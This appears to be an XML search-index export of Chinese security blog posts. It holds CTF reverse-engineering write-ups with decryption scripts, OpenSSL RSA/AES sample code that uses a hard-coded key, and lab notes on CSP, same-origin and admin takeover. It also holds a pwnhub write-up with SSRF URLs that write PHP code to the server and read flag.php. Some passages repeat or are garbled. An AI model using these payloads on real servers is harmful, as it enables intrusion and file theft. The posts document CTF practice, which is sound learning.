while ( 1 ) { s1[(_DWORD )v20] = ((_BYTE )v20 &amp; 0x89 | ~(_BYTE )v20 &amp; 0x76) ^ ((v17)[1][(_DWORD )v20] &amp; 0x89 | ~(v17)[1][(_DWORD )v20] &amp; 0x76); if ( ((unsigned int8)((y &lt; 10) ^ ((((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0)) | (y &lt; 10 &amp;&amp; (((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0)) &amp; 1 ) break;LABEL_24: s1[(_DWORD )v20] = ((_BYTE )v20 &amp; 0x38 | ~(_BYTE )v20 &amp; 0xC7) ^ ((v17)[1][(_DWORD )v20] &amp; 0x38 | ~(v17)[1][(_DWORD )v20] &amp; 0xC7); } (_DWORD )v20 = (_DWORD )v20 - 403331085 + 403331086; } v7 = strlen((v17)[1]); v8 = s1; s1[v7] = 0; v9 = v16; if ( !strcmp(v8, v16) ) HIDWORD(v12) = printf(“yes\n”, v9, v12); do v10 = (((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0; while ( !(((y &lt; 10 &amp;&amp; v10) | (unsigned int8)((y &lt; 10) ^ v10)) &amp; 1) ); v19 = 0; return v19;}其中： if ( !strcmp(v8, v16) ) HIDWORD(v12) = printf(“yes\n”, v9, v12);这里是将输入的字符串经过一定的处理然后与程序中的一段内存中的字符进行比较，匹配则输出yes 内存中的字符串不是动态加载的，可以看到： 注意要看ascii码，因为有些字符是不可见的 处理输入的字符串的可能性有两种，分别是 while ( 1 ) { s1[(_DWORD )v20] = ((_BYTE )v20 &amp; 0x89 | ~(_BYTE )v20 &amp; 0x76) ^ ((v17)[1][(_DWORD )v20] &amp; 0x89 | ~(v17)[1][(_DWORD *)v20] &amp; 0x76); if ( ((unsigned int8)((y &lt; 10) ^ ((((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0)) | (y &lt; 10 &amp;&amp; (((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0)) &amp; 1 ) break;LABEL_24: s1[(_DWORD )v20] = ((_BYTE )v20 &amp; 0x38 | ~(_BYTE )v20 &amp; 0xC7) ^ ((v17)[1][(_DWORD )v20] &amp; 0x38 | ~(v17)[1][(_DWORD )v20] &amp; 0xC7); }但是具体用哪种方式，要根据if语句判断，if判断的具体结果没法直接看到，因为x，y是未知的，要根据动态调试时的具体值判断。 这里发现if判断恰好相反，分析可知起到了给v20赋值的作用 还有一处比较重要： if ( strlen((v17)[1]) != 32 )这里说明附加的参数是32位，否则就会退出了 使用gdb调试： - 注意要附加32位的参数 - 注意提前设置断点，否则程序没有停止，会直接结束。 b main 首先查看未知的x，y的值p xp y在继续执行的过程中，发现x，y也一直为0根据各个判断条件的位置，设置断点跟踪跳转情况，发现各个判断条件的结果是固定的，并且每次执行的字符串处理函数都是第一个： 分析该语句 s1[(_DWORD )v20] = ((_BYTE )v20 &amp; 0x89 | ~(_BYTE )v20 &amp; 0x76) ^ ((v17)[1][(_DWORD )v20] &amp; 0x89 | ~(v17)[1][(_DWORD )v20] &amp; 0x76); 主要是对字符(s)及其对应位置数字(i)的一些操作， s1[i] = (i&amp;0x89|(~i)&amp;0x76)^(s[i]&amp;0x89|s[i]&amp;0x89|(~s[i])&amp;0x76) 发现他是可逆的运算，那么就反过来解密一下就能出来flag 注意逻辑运算优先级，同时注意到0x89与0x76的二进制码是互补的 进行该操作后，字符会与之前找到的程序存储的一段字符相匹配，逆向算法得到解密代码：s = [0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,0x64,0x66,0x55,0x7C,0x63,0x7F,0x62,0x6B,0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,0x79,0x6A,0x79,0x7A,0x68,0x72,0x6C,0x62]s1 = []for i in range(0,32): s1.append(chr((i&amp;0x89|(~i)&amp;0x76)^(s[i]&amp;0x89|s[i]&amp;0x89|(~s[i])&amp;0x76)))print s15.Reverse1IDA F5反编译main函数发现有一个encrypto加密函数，其关键代码如下: LODWORD(v16) = std::string::operator; while ( v16 ) { LODWORD(v2) = std::string::operator; v3 = v2; LODWORD(v4) = std::vector&lt;int,std::allocator&lt;int&gt;&gt;::operator; v18 = v3 + v4; LODWORD(v5) = std::string::operator; if ( (unsigned int8)is_lower(*v5) ) { v6 = 122; } else { LODWORD(v7) = std::string::operator; if ( (unsigned int8)is_upper(v7) ) { v6 = 90; } else { LODWORD(v8) = std::string::operator; v6 = v8; } } while ( v18 &gt; v6 ) v18 -= 26; LODWORD(v9) = std::string::operator; v10 = v9; LODWORD(v11) = std::string::operator; if ( v11 == 123 ) { v14 = 125; } else { LODWORD(v12) = std::string::operator; if ( v12 == 125 ) { v14 = 123; } else { LODWORD(v13) = std::string::operator; if ( (unsigned int8)is_alphabet(v13) ) { v14 = v18; } else { LODWORD(v15) = std::string::operator; v14 = v15; } } } v10 = v14; LODWORD(v16) = std::string::operator; }这个代码有一个关键位置在于 v4值不好确定，即primos数组的值实在运行后才复制过去的，我们很难确定，但是发现程序有一个init()函数 其内容为:int64 initial(void){ int64 result; // rax@10 unsigned int j; // [sp+4h] [bp-Ch]@4 unsigned int k; // [sp+8h] [bp-8h]@6 int i; // [sp+Ch] [bp-4h]@1 for ( i = 2; i &lt;= 1023; ++i ) ehprimo[(signed int64)i] = (i &amp; 1) != 0; for ( j = 3; ; j += 2 ) { result = j; if ( (signed int)j &gt; 1023 ) break; if ( ehprimo[(signed int64)(signed int)j] ) { std::vector&lt;int,std::allocator&lt;int&gt;&gt;::push_back(&amp;primos, &amp;j); for ( k = j * j; (signed int)k &lt;= 1023; k += j ) ehprimo[(signed int64)(signed int)k] = 0; } } return result;}简而言之就是在该内存上打出了一个素数表，我是通过gdb动态调试到encrypto函数后查看内存找到了该数组的值(pass:进入encrypto()说明init()已经生成完毕) 发现了地址为0x6160e0,素数表 写出自己的exploit：# coding=utf8def prime(): p = [] flag = 0 j = 3 while True: for i in range(2,j): if j%i == 0: break else: #print j flag += 1 p.append(j) j += 1 if flag == 33: break return ps = “LNLNGW}o3A3g5Z_1b_Xv5d_WbzgGnbG{“p = prime()ds = “”for i in range(0,32): if s[i] == “{“: ds += “}” elif s[i] == “}”: ds += “{“ elif s[i] &gt;= ‘A’ and s[i] &lt;= ‘Z’ or s[i] &gt;= ‘a’ and s[i] &lt;= ‘z’: lager = 0 lower = 0 if s[i] &lt;= ‘Z’:#大写 lager = ord(s[i])-p[i] while(lager &lt; ord(‘A’)): lager += 26 ds += chr(lager) else: lower = ord(s[i])-p[i] while(lower &lt; ord(‘a’)): lower += 26 ds += chr(lower) else: ds += s[i]print ds]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用OpenSSL 实现明文加解密]]></title>
    <url>%2F2016%2F12%2F26%2F%E5%88%A9%E7%94%A8OpenSSL%20%E5%AE%9E%E7%8E%B0%E6%98%8E%E6%96%87%E5%8A%A0%E8%A7%A3%E5%AF%86%2F</url>
    <content type="text"><![CDATA[最近在写OpenSSL的作业，发现网上的代码很乱，整理了一下 RSA1.密钥生成void generateKey() { / 生成公钥 / RSA rsa = RSA_generate_key(1024, RSA_F4, NULL, NULL); BIO bp = BIO_new(BIO_s_file()); BIO_write_filename(bp, “public.pem”); PEM_write_bio_RSAPublicKey(bp, rsa); BIO_free_all(bp); / 生成私钥 / bp = BIO_new_file(“private.pem”, “w+”); PEM_write_bio_RSAPrivateKey(bp, rsa, NULL, NULL, 4, NULL, NULL); BIO_free_all(bp); RSA_free(rsa);}2.公钥加密string bio_read_publicKey(string data) { OpenSSL_add_all_algorithms(); BIO bp = BIO_new(BIO_s_file()); BIO_read_filename(bp, “public.pem”); RSA rsaK = PEM_read_bio_RSAPublicKey(bp, NULL, NULL, NULL); if (NULL == rsaK) { perror(“read key file fail!”); } else { printf(“read success!”); int nLen = RSA_size(rsaK); printf(“len:%d\n”, nLen); } int nLen = RSA_size(rsaK); char pEncode = new char[nLen + 1]; int ret = RSA_public_encrypt(data.length(), (const unsigned char)data.c_str(), (unsigned char )pEncode, rsaK, RSA_PKCS1_PADDING); std::string strRet; if (ret &gt;= 0) { strRet = std::string(pEncode, ret); } delete[] pEncode; CRYPTO_cleanup_all_ex_data(); BIO_free_all(bp); RSA_free(rsaK); return strRet;}3.私钥解密string bio_read_privateKey(string data) { OpenSSL_add_all_algorithms(); BIO bp = BIO_new(BIO_s_file()); BIO_read_filename(bp, “private.pem“); RSA rsaK = PEM_read_bio_RSAPrivateKey(bp, NULL, NULL, NULL); if (NULL == rsaK) { perror(“read key file fail!”); } else { printf(“read success!\n”); } int nLen = RSA_size(rsaK); char pEncode = new char[nLen + 1]; int ret = RSA_private_decrypt(data.length(), (const unsigned char)data.c_str(), (unsigned char )pEncode, rsaK, RSA_PKCS1_PADDING); string strRet; if (ret &gt;= 0) { strRet = string(pEncode, ret); } delete[] pEncode; CRYPTO_cleanup_all_ex_data(); BIO_free_all(bp); RSA_free(rsaK); return strRet;}4.密文转为十进制实现int len = strlen((const char)pEncode);BIGNUM a = BN_new();BN_bin2bn((const unsigned char )pEncode, len, a);b = BN_bn2dec((const BIGNUM )a);这里的b就是十进制字符串#5.完整代码#include “stdafx.h”#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;windows.h&gt;#include &lt;openssl/rsa.h&gt; #include&lt;openssl/pem.h&gt; #include&lt;openssl/err.h&gt; #include &lt;openssl/bio.h&gt; #include &lt;fstream&gt; #include &lt;iostream&gt; #include &lt;string&gt; using namespace std;#pragma comment(lib, “libeay32.lib”) #pragma comment(lib, “ssleay32.lib”) char b;void generateKey() { / 生成公钥 / RSA rsa = RSA_generate_key(1024, RSA_F4, NULL, NULL); BIO bp = BIO_new(BIO_s_file()); BIO_write_filename(bp, “public.pem”); PEM_write_bio_RSAPublicKey(bp, rsa); BIO_free_all(bp); / 生成私钥 / bp = BIO_new_file(“private.pem”, “w+”); PEM_write_bio_RSAPrivateKey(bp, rsa, NULL, NULL, 4, NULL, NULL); BIO_free_all(bp); RSA_free(rsa);}string bio_read_privateKey(string data) { OpenSSL_add_all_algorithms(); BIO bp = BIO_new(BIO_s_file()); BIO_read_filename(bp, “prikey.pem”); RSA rsaK = PEM_read_bio_RSAPrivateKey(bp, NULL, NULL, NULL); if (NULL == rsaK) { perror(“read key file fail!”); } else { printf(“read success!\n”); } int nLen = RSA_size(rsaK); char pEncode = new char[nLen + 1]; int ret = RSA_private_decrypt(data.length(), (const unsigned char)data.c_str(), (unsigned char )pEncode, rsaK, RSA_PKCS1_PADDING); string strRet; if (ret &gt;= 0) { strRet = string(pEncode, ret); } delete[] pEncode; CRYPTO_cleanup_all_ex_data(); BIO_free_all(bp); RSA_free(rsaK); return strRet;}string bio_read_publicKey(string data) { OpenSSL_add_all_algorithms(); BIO bp = BIO_new(BIO_s_file()); BIO_read_filename(bp, “pubkey.pem”); RSA rsaK = PEM_read_bio_RSAPublicKey(bp, NULL, NULL, NULL); if (NULL == rsaK) { perror(“read key file fail!”); } else { printf(“read success!”); int nLen = RSA_size(rsaK); printf(“len:%d\n”, nLen); } int nLen = RSA_size(rsaK); char pEncode = new char[nLen + 1]; int ret = RSA_public_encrypt(data.length(), (const unsigned char)data.c_str(), (unsigned char )pEncode, rsaK, RSA_PKCS1_PADDING); std::string strRet; if (ret &gt;= 0) { strRet = std::string(pEncode, ret); } int len = strlen((const char)pEncode); BIGNUM a = BN_new(); BN_bin2bn((const unsigned char )pEncode, len, a); b = BN_bn2dec((const BIGNUM )a); delete[] pEncode; CRYPTO_cleanup_all_ex_data(); BIO_free_all(bp); RSA_free(rsaK); return strRet;}int main() {// generateKey(); char str = “我爱密码”; printf(“原文：%s\n”, str); string m = bio_read_publicKey(str); printf(“密文：\n————%s————–\n\n”, m.c_str()); printf(“十进制：\n———–%s————\n\n”, b); unsigned char p =(unsigned char ) m.c_str(); int j = 0; while ((p+j) != NULL) { printf(“%x”, (p + j)); j++; } cout &lt;&lt; endl; string miwen = m; string c = bio_read_privateKey(miwen); printf(“解密后：\n————%s————–\n\n”, c.c_str()); system(“pause”); return 0;}AES#include “stdafx.h”#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;openssl/aes.h&gt;#include &lt;iostream&gt;#define AES_BITS 128#define MSG_LEN 100000#pragma comment(lib, “libeay32.lib”)#pragma comment(lib, “ssleay32.lib”) #pragma comment(lib, “ws2_32.lib”)#define IP “127.0.0.1”#define PORT 8888using namespace std;int main(int argc, char argv[]){ int len; char key[AES_BLOCK_SIZE]; memcpy(key, “123412341234123”, 16); cout &lt;&lt; key[0]; system(“pause”); unsigned char iv[AES_BLOCK_SIZE]; FILE fp,fp1; fp = fopen(“1.txt”, “rb”); fp1 = fopen(“2.txt”,“ab”); fseek(fp, 0L, SEEK_END); len = ftell(fp); fseek(fp, 0L, SEEK_SET); char sourceStringTemp[MSG_LEN]; char dstStringTemp[MSG_LEN]; memset((char)sourceStringTemp, 0, MSG_LEN); memset((char)dstStringTemp, 0, MSG_LEN); fread(sourceStringTemp, 1, len, fp); int i; AES_KEY aes; if (AES_set_encrypt_key((unsigned char)key, 128, &amp;aes) &lt; 0) { return 0; } AES_cbc_encrypt((unsigned char)sourceStringTemp, (unsigned char)dstStringTemp, len, &amp;aes, iv, AES_ENCRYPT); /*下面为解密*/ printf(“enc %d:”, strlen((char)dstStringTemp)); for (i = 0; dstStringTemp[i]; i += 1) { printf(“%x”, (unsigned char)dstStringTemp[i]); } memset((char)sourceStringTemp, 0, MSG_LEN); if (AES_set_decrypt_key((unsigned char)key, 128, &amp;aes) &lt; 0) { return 0; } AES_cbc_encrypt((unsigned char)dstStringTemp, (unsigned char)sourceStringTemp, len, &amp;aes, iv, AES_DECRYPT); fwrite(sourceStringTemp, 1, len, fp1); printf(“\n”); printf(“dec %d:”, strlen((char)sourceStringTemp)); printf(“%s\n”, sourceStringTemp); for (i = 0; sourceStringTemp[i]; i += 1) { printf(“%x”, ( char)sourceStringTemp[i]); } printf(“\n”); system(“pause”); fclose(fp); fclose(fp1); return 0;}]]></content>
      <tags>
        <tag>密码学应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 文件上传实现及漏洞分析]]></title>
    <url>%2F2016%2F12%2F21%2FPHP%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%9E%E7%8E%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[PHP文件上传功能直接上代码 文件信息 上传文件:]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackingLab 综合关]]></title>
    <url>%2F2016%2F12%2F21%2FHackingLab%20%E7%BB%BC%E5%90%88%E5%85%B3%2F</url>
    <content type="text"><![CDATA[第一关1.首先注册账号 然后让你注册手机号，但是题目提示源码中有内部人员的手机号 于是查看源代码号码为13388453871 通过burpsuit发现该请求有三个字段 于是绑定成功，想想我们将该手机号绑在了admin的账号上。下一步就很明显了，利用查找密码功能找回admin密码。 2.利用Forgetpassword？ 通过用户名：admin；密码：XXXXXXXX 登录进去 即可 第一关1.首先注册账号 然后让你注册手机号，但是题目提示源码中有内部人员的手机号 于是查看源代码号码为13388453871 通过burpsuit发现该请求有三个字段 于是绑定成功，想想我们将该手机号绑在了admin的账号上。下一步就很明显了，利用查找密码功能找回admin密码。 2.利用Forgetpassword？ 通过用户名：admin；密码：XXXXXXXX 登录进去 即可发现flag key is yesBindphoneErrorGood第二关这个题有点坑，看了题解还原了一下，才知道是什么原因。不说了看题吧 首先有个登录界面 扫描了一下发现了用户名和密码test:test 登陆之后发现 然后就不知道怎么办了，看了题解说是有robots.txt。以后先看有没有这个~ 发现./myadminroot目录进去之后 发现要登录而且是admin登录，之后怎么注入，怎么登都不行看了题解才知道哦 1. 先用admin账户登录 2. 不用管弹框直接去./myadminroot目录即可 执行步骤如下图 之后就是key了 题目复现制作了一个登录页面来模仿 主要代码是 require(‘conn.php’); session_start(); $query_user=“select * from user where username = ‘$username‘ and pass = ‘$passwd‘“; $result = mysqli_query($connect,$query_user); $num_results=$result-&gt;num_rows; $_SESSION[‘isLogin’]=1; if($num_results == 0) { echo ‘login fail!!’; echo ‘&lt;script&gt;alert(“false”);window.location.href=”./session.php”;&lt;/script&gt;’; //重点在这里，点击确定之后将session赋值为0// header(“Location: http://baidu.com“); }./session.php&lt;?php session_start(); $_SESSION[‘isLogin’]=0;?&gt;总感觉这题怪怪的]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略 & 内容安全策略]]></title>
    <url>%2F2016%2F12%2F18%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20%26%20%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[为了更好的理解掌握 同源策略（Same origin policy）、内容安全策略(CSP,ContentSecurityPolicy)、跨站脚本攻击(Cross Site Scripting)、跨站请求伪造（Cross-site request forgery）、服务器端请求伪造（Server-Side Request Forgery）做了以下实验环境配置在80端口开放Apache服务器在80 为了更好的理解掌握 同源策略（Same origin policy）、内容安全策略(CSP,ContentSecurityPolicy)、跨站脚本攻击(Cross Site Scripting)、跨站请求伪造（Cross-site request forgery）、服务器端请求伪造（Server-Side Request Forgery）做了以下实验环境配置在80端口开放Apache服务器在8080端口开放Apache服务器实验一 CSP验证 &amp; 绕过CSP首先我们来验证CSP的作用，及内容 首先客户访问localhost:8080/test.php 在header中限制了请求资源./www2/test.php&lt;?phpheader(“Content-Security-Policy: style-src ‘self’ ‘unsafe-inline’;”);?&gt;&lt;link rel=“stylesheet” type=“text/css” href=“http://127.0.0.1/test.php?a=jinlongyu“&gt;接收端代码www/test.php&lt;?php$file = fopen(“1.txt”,“w”);fwrite($file, $_GET[‘a’]);?&gt; 说明资源不能被请求，受到了CSP的限制，他只能请求来自本服务器的资源，而一般有XSS防护的网站基本上都会这么做。如果将限制删除那么就不会出现此情况 如下图所示 资源请求成功。 上面主要是内容安全策略的问题，以及我的理解如有不对请指正。实验二同源策略问题一直以来困扰着我。直到做这个实验的时候才稍微理解了一点，下面我和大家分享一下。 在HTML资源请求时，只能获取目标服务器资源但不能直接修改该资源。 下面实验在8080:/1.php嵌入80:/1.php并且试图修改里面的html节点2 下面来看一下实验代码及实验效果。www2/1.php&lt;meta charset=“utf-8”&gt;&lt;iframe src=“http://localhost/1.php“ id=“myframe”&gt;&lt;/iframe&gt;&lt;/script&gt;&lt;a href=“#” onclick=“replaceContent()”&gt;点击替换内容&lt;/a&gt;&lt;script type=“text/javascript”&gt;content = ‘我把你的这部分理解成读取一段内容’; function replaceContent(){ document.getElementById(‘myframe’).contentWindow.document.body.innerText = content; }document.domain = “localhost”;&lt;/script&gt;www/1.php&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=“utf-8”&gt;&lt;head&gt; &lt;title&gt;测试平台1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;hahaha&lt;/p&gt;&lt;p&gt;fuck me&lt;/p&gt;&lt;p&gt;反弹至服务器&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;script type=“text/javascript” &gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;小实验1我们首先利用上述代码执行，发现被浏览器的同源策略限制了 小实验2修改上述代码 将www/1.php加上document.domain = “localhost”; 那么实验效果如下 实验三&lt;meta charset=“utf-8”&gt;&lt;script type=“text/javascript” src=“http://libs.baidu.com/jquery/2.0.0/jquery.js“&gt;&lt;/script&gt;&lt;iframe src=“http://localhost/2.php“ id=“myframe”&gt;&lt;/iframe&gt;&lt;/script&gt;&lt;a href=“#” onclick=“replaceContent()”&gt;点击替换内容&lt;/a&gt;&lt;script type=“text/javascript”&gt;content = ‘我把你的这部分理解成读取一段内容’; function replaceContent(){ document.getElementById(‘myframe’).contentWindow.document.body.innerText = content; }document.domain = “localhost”;&lt;/script&gt;&lt;?phpheader(‘Access-Control-Allow-Origin : http://127.0.0.1:8080/‘);echo 222;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=“utf-8”&gt;&lt;head&gt; &lt;title&gt;测试平台1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;hahaha&lt;/p&gt;&lt;p&gt;fuck me&lt;/p&gt;&lt;p&gt;反弹至服务器&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;script type=“text/javascript” &gt;document.domain = “localhost”;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <tags>
        <tag>WEB漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnhub——胖哈勃外传-第一集 writeup]]></title>
    <url>%2F2016%2F12%2F18%2Fpwnhub%E2%80%94%E2%80%94%E8%83%96%E5%93%88%E5%8B%83%E5%A4%96%E4%BC%A0-%E7%AC%AC%E4%B8%80%E9%9B%86%20writeup%2F</url>
    <content type="text"><![CDATA[第一步 查找漏洞查看漏洞 找了半天发现 源码中有一部分如下图 点击出现console.log(‘logo.jpg update sucess!’)查看http://54.223.2 第一步 查找漏洞查看漏洞 找了半天发现 源码中有一部分如下图 &lt;script src=“http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg“&gt;&lt;/script&gt;点击出现console.log(‘logo.jpg update sucess!’)查看http://54.223.231.220/logo.jpg发现二维码说明url将127.0.0.1:8888/test.png二维码存至logo.jpg下典型的csrf跨站点请求访问下面就要利用这个漏洞了第二步 再查找漏洞我们发现 &lt;script src=“http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg“&gt;&lt;/script&gt;没有什么利用的价值，我们容易伪造请求 那么继续找漏洞http://54.223.231.220/?date/2016-07/ 我们将url改为 http://54.223.231.220/?date/2016-07%3Cb%3Eyz%3C/b%3E/ 至此 ，我们可以伪造请求了第三步 伪造请求http://54.223.231.220/image.php?file=http://127.0.0.1:8888/?date/2016-07&lt;?php foreach(glob(“./“) as $i) {echo $i;}?&gt;/&amp;path=yz.php//注意二次编码为http://54.223.231.220/image.php?file=http://127.0.0.1:8888/?date/2016-07%253c%253fphp%2520foreach(glob(%2522.%252f%2522)%2520as%2520%2524i)%2520%257becho%2520%2524i%253b%257d%253f%253e/&amp;path=yz.php得到 发现flag.php 现在把他读出来http://54.223.231.220/image.php?file=http://127.0.0.1:8888/?date/2016-07&lt;?php echo file_get_contents(‘flag.php’)?&gt;/&amp;path=yz.php二次编码为http://54.223.231.220/image.php?file=http://127.0.0.1:8888/?date/2016-07%253c%253fphp%2becho%2bfile_get_contents(%2527flag.php%2527)%253f%253e/&amp;path=yz.php得到]]></content>
      <tags>
        <tag>write-up</tag>
      </tags>
  </entry>
</search>
